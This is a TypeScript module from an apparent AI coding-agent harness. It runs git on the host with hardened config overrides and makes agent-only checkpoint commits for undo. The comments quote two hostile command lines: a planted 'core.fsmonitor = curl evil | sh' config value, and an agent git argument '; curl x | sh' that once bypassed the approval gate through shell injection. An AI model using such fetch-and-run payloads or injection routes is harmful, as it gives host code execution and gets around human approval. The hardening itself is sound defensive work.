import { execFileSync } from "node:child_process";
import { existsSync, readFileSync, readdirSync, statSync } from "node:fs";
import { join } from "node:path";
import { allowedEnv } from "./executor";
import { runShell, type ShellResult } from "./shell";
import type { GitOp } from "./git-ops";

// Re-exported so callers that already import them from here keep working.
export { READ_ONLY_OPS, type GitOp } from "./git-ops";

// Git, and the checkpoints that make `undo` possible.
//
// Checkpointing through git rather than a copy directory is a deliberate
// choice: a checkpoint you can read with `git log` and `git diff` is one a
// person can inspect and trust, and one they can recover from by hand if this
// code is wrong. A hidden folder of file copies is opaque at exactly the moment
// someone needs to understand what happened.
//
// Undo only ever rewinds commits this agent made. The marker below is how it
// tells them apart, and why it will not quietly discard a commit someone else
// wrote that happens to sit on top.

/** Prefix on every commit the agent makes on its own behalf. Anything without
 *  it is somebody else's work and is never rewound. */
export const CHECKPOINT_PREFIX = "agent checkpoint:";

export function isRepo(root: string): boolean {
  const dotGit = join(root, ".git");
  if (!existsSync(dotGit)) return false;
  try {
    // A worktree or submodule has a .git FILE pointing elsewhere; git resolves it.
    if (statSync(dotGit).isFile()) return readFileSync(dotGit, "utf8").startsWith("gitdir:");
  } catch {
    return false;
  }
  // A real repository has HEAD. A stray .git directory without one is not a
  // repository: /root had one holding only info/, and treating it as a repo made
  // doctor call it one, sent checkpoints down the git path, and told the model it
  // was in a repository while every git command it ran exited 128.
  return existsSync(join(dotGit, "HEAD"));
}

// Every git command here runs on the host, outside any sandbox, in a
// directory whose contents may have been written by a model or uploaded by a
// stranger. Git is not a passive reader of that directory: its config can name
// programs to run (core.fsmonitor, hooks, pagers, diff and filter drivers,
// gpg.program), and `git status` or `git add` runs them. A planted
// `.git/config` with `core.fsmonitor = curl evil | sh` was a host shell on the
// next checkpoint. Workspace.write refuses `.git/` now, but a sandboxed command
// shares the workspace mount and can still write there, so the commands
// themselves must not trust the config they find.
//
// Command-line `-c` beats every config file, so the fixed overrides below win.
// Drivers are named by the config itself and cannot be switched off by a fixed
// flag, so each one found is blanked individually. git-lfs is the one driver
// left alone, and only with its stock commands: disabling it would commit raw
// binaries into a repository that relies on it.
const FIXED_OVERRIDES = [
  "core.fsmonitor=false",
  "core.hooksPath=/dev/null",
  "core.pager=cat",
  "core.alternateRefsCommand=",
  // Blank, so a planted external diff tool never runs. git then fails a
  // patch-producing diff loudly ("external diff died") rather than running
  // anything: every caller passes --no-ext-diff, and a new one must too.
  // A repository whose filter is marked required likewise fails to check
  // point once its filter is blanked, which is the safe direction.
  "diff.external=",
  "commit.gpgSign=false",
  "tag.gpgSign=false",
  "protocol.ext.allow=never",
  // Signature checks run a verifier program named by config: `git log` with
  // log.showSignature, or any %G format, would start it on the host. Show no
  // signatures, and point every verifier at a program that does nothing.
  "log.showSignature=false",
  "gpg.program=false",
  "gpg.ssh.program=false",
  "gpg.x509.program=false",
  "gpg.ssh.defaultKeyCommand=",
  // Other keys that name a program git may start.
  "core.sshCommand=false",
  "core.askPass=",
  "core.editor=false",
  "sequence.editor=false",
  "credential.helper=",
  "core.gitProxy=",
  // core.worktree would point the host's `git add -A` (and undo's reset) at
  // any directory on the machine; --work-tree below pins it to the workspace
  // and this stops a bare-repo flip from changing what that means.
  "core.bare=false",
  // Never look inside submodules. Each one has its own config, which the
  // driver blanking below never reads, and status/diff would run git in it.
  "diff.ignoreSubmodules=all",
  "submodule.recurse=false",
  "status.submoduleSummary=false",
];

/** The commands `git lfs install` writes, with and without `--skip`. */
const LFS_COMMAND = /^git-lfs (clean -- %f|smudge( --skip)? -- %f|filter-process( --skip)?)$/;

/** Driver keys that name a program, as `section.<name>.key`. */
const DRIVER_KEY = /^(filter|diff|merge)\.(.+)\.(clean|smudge|process|textconv|command|driver)$/i;

/** The environment git runs with: the executor's allow-list, never the
 *  parent's secrets, and nothing that could prompt or page. */
export function gitEnv(): NodeJS.ProcessEnv {
  return allowedEnv(process.env, { GIT_TERMINAL_PROMPT: "0", GIT_PAGER: "cat", PAGER: "cat" });
}

/** `-c` overrides for every program-naming key the config at `root` sets. */
export function driverOverrides(root: string): string[] | null {
  let listing = "";
  try {
    // `git config --list` reads config and runs nothing from it. Same
    // repository as the command it guards, via the same GIT_DIR pin.
    listing = execFileSync("git", ["config", "--list", "-z"], {
      cwd: root,
      env: { ...gitEnv(), ...gitLocation(root) },
      encoding: "utf8",
      timeout: 10_000,
      stdio: ["ignore", "pipe", "ignore"],
    });
  } catch {
    // Unreadable config (a slow include, a broken file) used to mean "no
    // drivers to blank", and the command then ran with whatever the config
    // named. Not knowing is a reason not to run.
    if (!isRepo(root) && !existsSync(join(root, ".git", "config"))) return [];
    return null;
  }
  const out = new Set<string>();
  for (const entry of listing.split("\0")) {
    if (!entry) continue;
    const nl = entry.indexOf("\n");
    const key = nl === -1 ? entry : entry.slice(0, nl);
    const value = nl === -1 ? "" : entry.slice(nl + 1);
    if (key.toLowerCase() === "diff.external") {
      out.add("diff.external=");
      continue;
    }
    const match = DRIVER_KEY.exec(key);
    if (!match) continue;
    if (match[1].toLowerCase() === "filter" && LFS_COMMAND.test(value.trim())) continue;
    // A blank textconv makes git try to run "" and fail the diff; `cat` shows
    // the file as it is, which is what no textconv means, and runs nothing
    // the repository chose. Everything else is blanked.
    out.add(match[3].toLowerCase() === "textconv" ? `${key}=cat` : `${key}=`);
  }
  return [...out];
}

/** The `git` prefix every host invocation uses, overrides included. */
export function safeGit(root: string): string | null {
  const drivers = driverOverrides(root);
  if (drivers === null) return null;
  return ["git", ...[...FIXED_OVERRIDES, ...drivers].flatMap((o) => ["-c", quote(o)])].join(" ");
}

/**
 * Pins the repository and work tree to the workspace when the workspace is a
 * repository root. core.worktree in .git/config would otherwise send the
 * host's `git add -A` (and undo's reset) to any directory on the machine, and
 * a command-line `-c core.worktree` does not override it: only GIT_DIR plus
 * GIT_WORK_TREE do. A workspace that is a subdirectory of a larger repository
 * (the CLI run inside a monorepo package) keeps normal discovery.
 */
export function gitLocation(root: string): NodeJS.ProcessEnv {
  // Only a real repository: the sandbox guard leaves an empty .git in a
  // workspace that has none (see guardGitDir), and pinning GIT_DIR to that
  // would break discovery of an enclosing repository.
  return isRepo(root) ? { GIT_DIR: join(root, ".git"), GIT_WORK_TREE: root } : {};
}

const READ_ONLY_GIT = new Set([
  "status",
  "log",
  "diff",
  "show",
  "branch",
  "remote",
  "rev-parse",
  "ls-files",
]);

const NESTED_SKIP = new Set(["node_modules", ".git", "dist", "build", ".next", ".venv", "target"]);

/** Directories under `root` that hold their own `.git`, breadth-first and
 *  bounded so a huge tree cannot stall a command. */
export function nestedRepos(root: string, maxDirs = 2000): string[] {
  const found: string[] = [];
  const queue: string[] = [root];
  let seen = 0;
  while (queue.length > 0 && seen < maxDirs) {
    const dir = queue.shift()!;
    seen++;
    let entries: import("node:fs").Dirent[];
    try {
      entries = readdirSync(dir, { withFileTypes: true });
    } catch {
      continue;
    }
    for (const e of entries) {
      if (!e.isDirectory() || NESTED_SKIP.has(e.name)) continue;
      const child = join(dir, e.name);
      if (existsSync(join(child, ".git"))) found.push(child);
      queue.push(child);
    }
  }
  return found;
}

/** Global options that take the next word as their value. */
const GIT_VALUE_OPTIONS = new Set(["-C", "-c", "--git-dir", "--work-tree", "--namespace"]);

/** The subcommand of every `git` call in a shell command, in order. A call
 *  whose subcommand cannot be found counts as "" (not read-only). */
export function gitSubcommands(command: string): string[] {
  const words = command.split(/[\s;&|()`]+/).filter(Boolean);
  const subs: string[] = [];
  for (let i = 0; i < words.length; i++) {
    if (words[i] !== "git") continue;
    let j = i + 1;
    while (j < words.length && words[j].startsWith("-")) {
      j += GIT_VALUE_OPTIONS.has(words[j]) ? 2 : 1;
    }
    subs.push(words[j] ?? "");
    i = j;
  }
  return subs;
}

/**
 * The same protection for `git` typed into a host shell (the unsandboxed
 * executor). The command classifier lets read-only git subcommands run without
 * asking, so those must not obey a config that names programs either.
 *
 * Returns the environment to add (git's GIT_CONFIG_COUNT form of `-c`, which
 * every git in that shell, and its children, honours), `{}` when there is
 * nothing to protect (no git, or a git call that writes and was therefore
 * approved by the person, whose own hooks and signing should then apply), or
 * null when the repository's config cannot be read and the command should not
 * run.
 */
export function shellGitEnv(command: string, cwd: string): NodeJS.ProcessEnv | null {
  const subs = gitSubcommands(command);
  if (subs.length === 0) return {};
  if (!subs.every((sub) => READ_ONLY_GIT.has(sub))) return {};
  // A shell command can `cd` into any repository under the workspace (or name
  // one with -C) before running git, and each has its own config. The
  // overrides go into the environment, so they apply to every git the command
  // starts: blank the drivers of every repository found, not just this one.
  const drivers = new Set<string>();
  for (const repo of [cwd, ...nestedRepos(cwd)]) {
    if (repoRefusal(repo)) return null;
    const found = driverOverrides(repo);
    if (found === null) return null;
    for (const d of found) drivers.add(d);
  }
  // diff.external is blanked only where a repository sets it: blanking it
  // unconditionally makes git try to run "" and fail every patch-producing
  // diff, and people do not type --no-ext-diff.
  const overrides = [...FIXED_OVERRIDES.filter((o) => o !== "diff.external="), ...drivers];
  const env: NodeJS.ProcessEnv = { GIT_CONFIG_COUNT: String(overrides.length) };
  overrides.forEach((o, i) => {
    const eq = o.indexOf("=");
    env[`GIT_CONFIG_KEY_${i}`] = o.slice(0, eq);
    env[`GIT_CONFIG_VALUE_${i}`] = o.slice(eq + 1);
  });
  return env;
}

/** Run `git <rest>` in `root` with the overrides and environment above. */
/**
 * Why git must not run on this repository, or null. A .git directory that
 * borrows objects from elsewhere (objects/info/alternates) or names another
 * repository as its common dir reads that other repository's data, and in a
 * workspace that is another user's code or a host directory. A linked
 * worktree is a .git FILE, not this, so it is unaffected.
 */
export function repoRefusal(root: string): string | null {
  const dotGit = join(root, ".git");
  try {
    if (!statSync(dotGit).isDirectory()) return null;
  } catch {
    return null;
  }
  if (existsSync(join(dotGit, "objects", "info", "alternates"))) {
    return "This repository borrows objects from another one (objects/info/alternates), so git was not run on it.";
  }
  if (existsSync(join(dotGit, "commondir"))) {
    return "This repository's .git points at another repository (commondir), so git was not run on it.";
  }
  return null;
}

export function runGit(root: string, rest: string, timeoutMs = 30_000): Promise<ShellResult> {
  const refusal = repoRefusal(root);
  const prefix = refusal ? null : safeGit(root);
  if (prefix === null) {
    return Promise.resolve({
      ok: false,
      code: null,
      stdout: "",
      stderr: refusal ?? "This repository's git config could not be read, so git was not run.",
      timedOut: false,
    });
  }
  return runShell(`${prefix} ${rest}`, {
    cwd: root,
    timeoutMs,
    env: { ...gitEnv(), ...gitLocation(root) },
  });
}

/** Shell-quote a single argument. Arguments come from a model, so they are
 *  never interpolated raw. */
function quote(value: string): string {
  return `'${value.replace(/'/g, `'\\''`)}'`;
}

export async function git(
  root: string,
  op: GitOp,
  args: string[] = [],
  opts: { timeoutMs?: number } = {},
): Promise<ShellResult> {
  return runGit(root, `${op} ${args.map(quote).join(" ")}`.trim(), opts.timeoutMs ?? 60_000);
}

/** Files git reports as changed, staged or not, relative to the repo root. */
export async function changedFiles(root: string): Promise<string[]> {
  const result = await runGit(root, "status --porcelain", 30_000);
  if (!result.ok) return [];
  return result.stdout
    .split("\n")
    .map((line) => line.slice(3).trim())
    .filter(Boolean);
}

export interface CheckpointResult {
  ok: boolean;
  /** Null when there was nothing to commit, which is not a failure. */
  sha: string | null;
  message: string;
}

/**
 * Commit whatever changed, tagged as the agent's.
 *
 * Nothing to commit is a success with a null sha, not an error: a turn that
 * verified cleanly without touching a file is a perfectly ordinary outcome and
 * should not read as a failure in the event log.
 */
export async function checkpoint(root: string, description: string): Promise<CheckpointResult> {
  if (!isRepo(root)) return { ok: false, sha: null, message: "Not a git repository." };

  const changed = await changedFiles(root);
  if (changed.length === 0) return { ok: true, sha: null, message: "Nothing to check point." };

  const add = await runGit(root, "add -A", 60_000);
  if (!add.ok) return { ok: false, sha: null, message: add.stderr || "git add failed." };

  const subject = `${CHECKPOINT_PREFIX} ${description}`.slice(0, 200);
  // Identity is supplied per-invocation rather than written into the repo's
  // config, so checkpointing never mutates the user's git settings.
  const commit = await runGit(
    root,
    `-c user.name='DevStation agent' -c user.email='agent@devstation.online' commit -m ${quote(subject)}`,
    60_000,
  );
  if (!commit.ok) return { ok: false, sha: null, message: commit.stderr || "git commit failed." };

  const head = await runGit(root, "rev-parse HEAD", 30_000);
  return { ok: true, sha: head.stdout.trim() || null, message: subject };
}

/** Is HEAD a commit this agent made? */
export async function headIsCheckpoint(root: string): Promise<boolean> {
  const result = await runGit(root, "log -1 --pretty=%s", 30_000);
  return result.ok && result.stdout.trim().startsWith(CHECKPOINT_PREFIX);
}

/**
 * Rewind the most recent agent checkpoint.
 *
 * Refuses when HEAD is not one. That is the important part: if someone
 * committed on top of the agent's work, a blind `reset --hard HEAD~1` would
 * throw away their commit instead of the agent's, and they would have no
 * warning it happened.
 */
export async function undoCheckpoint(root: string): Promise<{ ok: boolean; message: string }> {
  if (!isRepo(root))
    return { ok: false, message: "Not a git repository, so there is nothing to undo." };
  if (!(await headIsCheckpoint(root))) {
    return {
      ok: false,
      message:
        "The most recent commit was not made by the agent, so nothing was undone. " +
        "Undo only ever rewinds the agent's own checkpoints.",
    };
  }
  const subject = await runGit(root, "log -1 --pretty=%s", 30_000);
  const reset = await runGit(root, "reset --hard HEAD~1", 60_000);
  if (!reset.ok) return { ok: false, message: reset.stderr || "git reset failed." };
  return { ok: true, message: `Undid ${subject.stdout.trim()}` };
}

/**
 * The newest commit that the agent did not make.
 *
 * This is what "what has the agent changed" is measured against: everything
 * from here to the working tree is the agent's, and everything before it is
 * the person's. Null when the agent's checkpoints go all the way back, which
 * happens in a repository it started itself.
 */
export async function checkpointBase(root: string): Promise<string | null> {
  if (!isRepo(root)) return null;
  const log = await runGit(root, "log --pretty=%H%x09%s -n 200", 30_000);
  if (!log.ok) return null;
  for (const line of log.stdout.split("\n")) {
    const [sha, ...rest] = line.split("\t");
    if (!sha) continue;
    if (!rest.join("\t").startsWith(CHECKPOINT_PREFIX)) return sha;
  }
  return null;
}

/**
 * `diff` and `status` as the agent needs to read them.
 *
 * The orchestrator commits a checkpoint after every turn that changes a file.
 * That is what makes undo work, and it also means a plain `git diff` right
 * after an edit shows nothing and `git status` reports a clean tree. An agent
 * that trusts those concludes its edit did not take, and goes round again.
 * Seen on a live run: fifteen steps and a dollar spent re-reading a file it had
 * already changed correctly.
 *
 * So both are answered against the last commit the agent did not make, which
 * is what "what have I changed" actually means here. Uncommitted work still
 * shows, because the range ends at the working tree.
 */
export async function agentDiff(root: string, extra: string[] = []): Promise<ShellResult> {
  const base = await checkpointBase(root);
  // Quoted, like git() above. These arguments come from the model, and until
  // this was fixed they were spliced into a shell string raw: an agent could
  // run `git {"op":"diff","args":["; curl x | sh"]}` and execute anything it
  // liked on the host. The gate did not help, because `diff` classifies as
  // project.inspect, which never asks. Verified exploitable before the fix.
  const args = extra.length > 0 ? ` ${extra.map(quote).join(" ")}` : "";
  const diff = await runGit(
    root,
    base
      ? `diff --no-ext-diff --no-textconv ${base}${args}`
      : `diff --no-ext-diff --no-textconv HEAD${args}`,
    60_000,
  );

  // A file the agent has just created is untracked, and `git diff` says
  // nothing about untracked files. Leaving them out would reproduce the exact
  // confusion this function exists to prevent, one turn earlier.
  const untracked = await runGit(root, "ls-files --others --exclude-standard", 30_000);
  const created = untracked.stdout.trim();
  if (!created) return diff;

  return {
    ...diff,
    stdout: `${diff.stdout}${diff.stdout.endsWith("\n") || !diff.stdout ? "" : "\n"}\nNew files, not yet committed:\n${created}`,
  };
}

export async function agentStatus(root: string): Promise<ShellResult> {
  const status = await runGit(root, "status --short", 30_000);
  const base = await checkpointBase(root);
  if (!base) return status;

  const since = await runGit(root, `diff --name-status ${base}`, 30_000);
  const changed = since.stdout.trim();
  if (!changed) return status;

  return {
    ...status,
    stdout:
      `${status.stdout.trim() || "Nothing uncommitted."}\n\n` +
      "Changed so far in this run, and already checkpointed:\n" +
      changed,
  };
}

/** The agent's checkpoints, newest first. */
export async function listCheckpoints(root: string, limit = 20): Promise<string[]> {
  if (!isRepo(root)) return [];
  const result = await runGit(root, `log -${limit} --pretty=%h%x09%s`, 30_000);
  if (!result.ok) return [];
  return result.stdout
    .split("\n")
    .filter((line) => line.includes(CHECKPOINT_PREFIX))
    .map((line) => line.trim())
    .filter(Boolean);
}
